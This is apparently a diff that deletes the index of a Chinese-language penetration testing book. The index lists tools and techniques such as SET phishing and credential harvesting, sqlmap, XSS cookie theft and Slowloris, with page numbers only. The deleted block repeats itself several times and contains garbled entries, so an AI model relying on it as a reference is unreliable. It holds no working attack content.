-- w3af, 结果标签 104
-- 逆向工程 30
-- 评审阶段 282
-- RiRs 39
-- Robots.txt 文件 35
-- 盐盐 152
-- dumpump 161
-- 萨班斯-奥克斯法 (SOX) 280
-- SLE 15
-- Slowloris 关于 241
-- 运行 241
-- 下载 URL 241
-- 嗅探与欺骗 30
-- SniffJoke 246
-- 社会工程攻击 134
-- 社会工程工具。参阅 SET
-- 社交媒体 41
-- SOW 284, 295
-- 活动报告 296
-- 客户端渗透测试报告 296
-- 执行报告 295
-- 执行报告, 示例 295
-- 主机报告 296
-- 主机报告 296
-- 材料 298, 299
-- 外部渗透测试, 296
-- 用户报告 296
-- 漏洞报告 296
-- SQL
-  - 关于 200, 201
-  - 注入 202, 203
-  - sqlmap 203, 204
-  - sqlmap 203, 204
-- SSL 剥离 122
-- SSL 剥离 261, 262
-- 安全技术实施。参阅 STIG
-- 压力测试 31
-- 发现 289
-- 系统服务 31
-- web 应用程序 8, 9
-- web 历史 36-38
-- 区域注册机构。参阅 RIRs
-- 执行 285, 286
-- 时间线 284
-- 安全套层 (SSL) 协议 236
-- 安全审计 133
-- 报告按钮, DirBuster 113
-- 报告格式
-- 附录 294
-- 保密性声明 283
-- 页面 283
-- 文档控制 284
-- 执行摘要 285, 286
-- 发现 289
-- 方法论 286, 287
-- 网络, 连接 292, 293
-- 网络, 建议 292, 293
-- 详细程序 288
-- 时间线 284
-- 敏感信息设施 (SCIF) 283
-- 服务器 73
-- 服务端攻击 74
-- 服务命令 98
-- 会话耗尽 236
-- 会话管理
-  - 关于 177
-  - 漏洞 290, 292
-- 报告工具 31
-- Kali, 报告工具
-- KeepNote 301
-- MagicTree 301
-- Maltego casefile 301
-- 示例报告 302-310
-- SET
-  - 关于 130, 131, 230, 231
-  - 伪邮件发送 141, 142
-  - mpreter 139
-  - 设置 131, 132
-  - Site Cloner 140
-  - 模板, 选择 232
-  - 用户, 输入 233
-  - 使用攻击 132-134
-  - 使用, 克隆 132-134
-- SET 密码采集。参阅 SET
-- Shodan 42
-- 会话劫持 190
-- Siege 247
-- 单次损失预期。SLE
-- Site Cloner 140
-- Owasp-Zap, 站点窗口 91
-- Skipfish
-  - 关于 78, 80
-  - 命令选项 78
-- Owasp-Zap, 报告标签 94
-- 报价请求 (RFP) 关于 281
-- w3af, 结果标签 104
-- 逆向工程 30
-- 评审阶段 282
-- RiRs 39
-- Robots.txt 文件 35
-- 盐盐 152
-- dumpump 161
-- 萨班斯-奥克斯法 (SOX) 280
-- SLE 15
-- Slowloris 关于 241
-- 运行 241
-- 下载 URL 241
-- 嗅探与欺骗 30
-- SniffJoke 246
-- 社会工程攻击 134
-- 社会工程工具。参阅 SET
-- 社交媒体 41
-- SOW 284, 295
-- 活动报告 296
-- 客户端渗透测试报告 296
-- 执行报告 295
-- 执行报告, 示例 295
-- 主机报告 296
-- 主机报告 296
-- 材料 298, 299
-- 外部渗透测试, 296
-- 用户报告 296
-- 漏洞报告 296
-- SQL
-  - 关于 200, 201
-  - 注入 202, 203
-  - sqlmap 203, 204
-  - sqlmap 203, 204
-- SSL 剥离 122
-- SSL 剥离 261, 262
-- 安全技术实施。参阅 STIG
-- 压力测试 31
-- 发现 289
-- 系统服务 31
-- web 应用程序 8, 9
-- web 历史 36-38
-- 区域注册机构。参阅 RIRs
-- 执行 285, 286
-- 时间线 284
-- 安全套层 (SSL) 协议 236
-- 安全审计 133
-- 报告按钮, DirBuster 113
-- 报告格式
-- 附录 294
-- 保密性声明 283
-- 页面 283
-- 文档控制 284
-- 执行摘要 285, 286
-- 发现 289
-- 方法论 286, 287
-- 网络, 连接 292, 293
-- 网络, 建议 292, 293
-- 详细程序 288
-- 时间线 284
-- 敏感信息设施 (SCIF) 283
-- 服务器 73
-- 服务端攻击 74
-- 服务命令 98
-- 会话耗尽 236
-- 会话管理
-  - 关于 177
-  - 漏洞 290, 292
-- 报告工具 31
-- Kali, 报告工具
-- KeepNote 301
-- MagicTree 301
-- Maltego casefile 301
-- 示例报告 302-310
-- SET
-  - 关于 130, 131, 230, 231
-  - 伪邮件发送 141, 142
-  - mpreter 139
-  - 设置 131, 132
-  - Site Cloner 140
-  - 模板, 选择 232
-  - 用户, 输入 233
-  - 使用攻击 132-134
-  - 使用, 克隆 132-134
-- SET 密码采集。参阅 SET
-- Shodan 42
-- 会话劫持 190
-- Siege 247
-- 单次损失预期。SLE
-- Site Cloner 140
-- Owasp-Zap, 站点窗口 91
-- Skipfish
-  - 关于 78, 80
-  - 命令选项 78
-- Owasp-Zap, 报告标签 94
-- 报价请求 (RFP) 关于 281
-- w3af, 结果标签 104
-- 逆向工程 30
-- 评审阶段 282
-- RiRs 39
-- Robots.txt 文件 35
-- 盐盐 152
-- dumpump 161
-- 萨班斯-奥克斯法 (SOX) 280
-- SLE 15
-- Slowloris 关于 241
-- 运行 241
-- 下载 URL 241
-- 嗅探与欺骗 30
-- SniffJoke 246
-- 社会工程攻击 134
-- 社会工程工具。参阅 SET
-- 社交媒体 41
-- SOW 284, 295
-- 活动报告 296
-- 客户端渗透测试报告 296
-- 执行报告 295
-- 执行报告, 示例 295
-- 主机报告 296
-- 主机报告 296
-- 材料 298, 299
-- 外部渗透测试, 296
-- 用户报告 296
-- 漏洞报告 296
-- SQL
-  - 关于 200, 201
-  - 注入 202, 203
-  - sqlmap 203, 204
-  - sqlmap 203, 204
-- SSL 剥离 122
-- SSL 剥离 261, 262
-- 安全技术实施。参阅 STIG
-- 压力测试 31
-- 发现 289
-- 系统服务 31
-- web 应用程序 8, 9
-- web 历史 36-38
-- 区域注册机构。参阅 RIRs
-- 执行 285, 286
-- 时间线 284
-- 安全套层 (SSL) 协议 236
-- 安全审计 133
-- 报告按钮, DirBuster 113
-- 报告格式
-- 附录 294
-- 保密性声明 283
-- 页面 283
-- 文档控制 284
-- 执行摘要 285, 286
-- 发现 289
-- 方法论 286, 287
-- 网络, 连接 292, 293
-- 网络, 建议 292, 293
-- 详细程序 288
-- 时间线 284
-- 敏感信息设施 (SCIF) 283
-- 服务器 73
-- 服务端攻击 74
-- 服务命令 98
-- 会话耗尽 236
-- 会话管理
-  - 关于 177
-  - 漏洞 290, 292
-- 报告工具 31
-- Kali, 报告工具
-- KeepNote 301
-- MagicTree 301
-- Maltego casefile 301
-- 示例报告 302-310
-- SET
-  - 关于 130, 131, 230, 231
-  - 伪邮件发送 141, 142
-  - mpreter 139
-  - 设置 131, 132
-  - Site Cloner 140
-  - 模板, 选择 232
-  - 用户, 输入 233
-  - 使用攻击 132-134
-  - 使用, 克隆 132-134
-- SET 密码采集。参阅 SET
-- Shodan 42
-- 会话劫持 190
-- Siege 247
-- 单次损失预期。SLE
-- Site Cloner 140
-- Owasp-Zap, 站点窗口 91
-- Skipfish
-  - 关于 78, 80
-  - 命令选项 78
-- Owasp-Zap, 报告标签 94
-- 报价请求 (RFP) 关于 281
-- w3af, 结果标签 104
-- 逆向工程 30
-- 评审阶段 282
-- RiRs 39
-- Robots.txt 文件 35
-- 盐盐 152
-- dumpump 161
-- 萨班斯-奥克斯法 (SOX) 280
-- SLE 15
-- Slowloris 关于 241
-- 运行 241
-- 下载 URL 241
-- 嗅探与欺骗 30
-- SniffJoke 246
-- 社会工程攻击 134
-- 社会工程工具。参阅 SET
-- 社交媒体 41
-- SOW 284, 295
-- 活动报告 296
-- 客户端渗透测试报告 296
-- 执行报告 295
-- 执行报告, 示例 295
-- 主机报告 296
-- 主机报告 296
-- 材料 298, 299
-- 外部渗透测试, 296
-- 用户报告 296
-- 漏洞报告 296
--# X
-- XSS
-  - 关于 204
-  - Cookie 窃取 206, 207
-  - 测试 205
-# Z
-- ZAP
-  - 关于 225, 226
-  - SEED 文件 228, 229
-  - 设置, 使用 Firefox 226, 229
-  - Zapproxy。参阅 Owasp-Zap
-
-
-
 
 # BackTrack - 无线网络安全测试
 
@@ -6976,4 +6683,3 @@ ISBN: 978-1-84951-742-3 | 平装本：268 页
 学习更多，让你的父母为你自豪 :)
 顺颂商祺
 www.PlentyofeBooks.net
-
